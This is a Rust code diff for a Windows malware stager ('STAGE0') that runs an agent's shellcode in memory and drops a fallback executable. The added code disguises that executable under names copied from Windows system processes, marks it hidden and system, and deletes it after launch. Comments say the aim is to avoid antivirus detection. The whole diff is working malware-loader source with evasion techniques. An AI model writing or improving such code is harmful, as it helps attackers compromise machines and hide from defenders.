@@ -185,6 +185,13 @@ fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error
         #[cfg(feature = "dev")]
         println!("[STAGE0] Memory protection changed to RX");
         
+        // Add exception handler extern
+        #[link(name = "kernel32")]
+        extern "system" {
+            fn GetExitCodeThread(hThread: HANDLE, lpExitCode: *mut DWORD) -> i32;
+            fn GetLastError() -> DWORD;
+        }
+        
         // Create thread to execute shellcode
         let thread = unsafe {
             CreateThread(
@@ -198,14 +205,35 @@ fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error
         };
         
         if thread.is_null() {
-            return Err("CreateThread failed".into());
+            let err = unsafe { GetLastError() };
+            return Err(format!("CreateThread failed with error: {}", err).into());
         }
         
         #[cfg(feature = "dev")]
         println!("[STAGE0] Shellcode thread created, waiting for execution...");
         
-        // Wait indefinitely for the thread (agent runs in this thread)
-        unsafe { WaitForSingleObject(thread, 0xFFFFFFFF); }
+        // Wait for thread with timeout to see if it crashes immediately
+        // 5 second timeout for initial check
+        let wait_result = unsafe { WaitForSingleObject(thread, 5000) };
+        
+        #[cfg(feature = "dev")]
+        {
+            let mut exit_code: DWORD = 0;
+            unsafe { GetExitCodeThread(thread, &mut exit_code) };
+            println!("[STAGE0] Wait result: {} (0=SIGNALED, 258=TIMEOUT, 0xFFFFFFFF=FAILED)", wait_result);
+            println!("[STAGE0] Thread exit code: {} (259=STILL_ACTIVE, 0xC0000005=ACCESS_VIOLATION)", exit_code);
+            
+            if exit_code == 0xC0000005 {
+                println!("[STAGE0] ERROR: Shellcode crashed with ACCESS_VIOLATION!");
+            } else if exit_code == 259 {
+                println!("[STAGE0] Shellcode still running, waiting indefinitely...");
+            }
+        }
+        
+        // If still running, wait indefinitely
+        if wait_result == 258 { // WAIT_TIMEOUT
+            unsafe { WaitForSingleObject(thread, 0xFFFFFFFF); }
+        }
         
         Ok(())
     }
@@ -216,30 +244,84 @@ fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error
     }
 }
 
-/// Fallback: Execute PE via temporary file (detected by AV but works)
+/// Fallback: Execute PE via temporary file with self-deletion
+/// Uses random name, hidden attributes, and schedules self-delete
 #[cfg(target_os = "windows")]
 fn execute_pe_via_temp_file(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     use std::fs;
     use std::process::Command;
     use std::env;
+    use std::ptr;
+    use std::ffi::c_void;
+    
+    type HANDLE = *mut c_void;
+    type DWORD = u32;
+    type BOOL = i32;
+    type LPCWSTR = *const u16;
+    
+    const FILE_ATTRIBUTE_HIDDEN: DWORD = 0x02;
+    const FILE_ATTRIBUTE_SYSTEM: DWORD = 0x04;
+    
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn SetFileAttributesW(lpFileName: LPCWSTR, dwFileAttributes: DWORD) -> BOOL;
+    }
     
     #[cfg(feature = "dev")]
-    println!("[STAGE0] Fallback: Writing PE to temp file (may be detected by AV)");
+    println!("[STAGE0] Fallback: Writing PE to temp file (stealth mode)");
     
     let temp_dir = env::temp_dir();
+    
+    // Generate random-looking name (mimics Windows system processes)
     let timestamp = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
-        .as_secs();
-    let filename = format!("svchost_{}.exe", timestamp % 100000);
+        .as_nanos();
+    
+    // Use names that blend in with Windows
+    let names = ["RuntimeBroker", "SearchProtocol", "WmiPrvSE", "dllhost", "conhost", "taskhostw"];
+    let name_idx = (timestamp as usize) % names.len();
+    let random_suffix = (timestamp % 10000) as u32;
+    let filename = format!("{}_{}.exe", names[name_idx], random_suffix);
     let agent_path = temp_dir.join(&filename);
     
+    // Write the PE
     fs::write(&agent_path, pe_bytes)?;
     
-    #[cfg(feature = "dev")]
-    println!("[STAGE0] Spawning: {:?}", agent_path);
+    // Set hidden + system attributes
+    let wide_path: Vec<u16> = agent_path.to_string_lossy()
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
+    unsafe {
+        SetFileAttributesW(wide_path.as_ptr(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
     
-    Command::new(&agent_path).spawn()?;
+    #[cfg(feature = "dev")]
+    println!("[STAGE0] Spawning hidden: {:?}", agent_path);
+    
+    // Spawn the process
+    let child = Command::new(&agent_path).spawn()?;
+    let pid = child.id();
+    
+    #[cfg(feature = "dev")]
+    println!("[STAGE0] Agent spawned with PID: {}", pid);
+    
+    // Schedule self-deletion after agent starts (5 second delay)
+    // The agent will be running from memory by then
+    let path_clone = agent_path.clone();
+    std::thread::spawn(move || {
+        std::thread::sleep(std::time::Duration::from_secs(5));
+        // Try to delete multiple times (file might be locked initially)
+        for _ in 0..10 {
+            if fs::remove_file(&path_clone).is_ok() {
+                #[cfg(feature = "dev")]
+                println!("[STAGE0] Temp file deleted successfully");
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_secs(2));
+        }
+    });
     
     Ok(())
 }
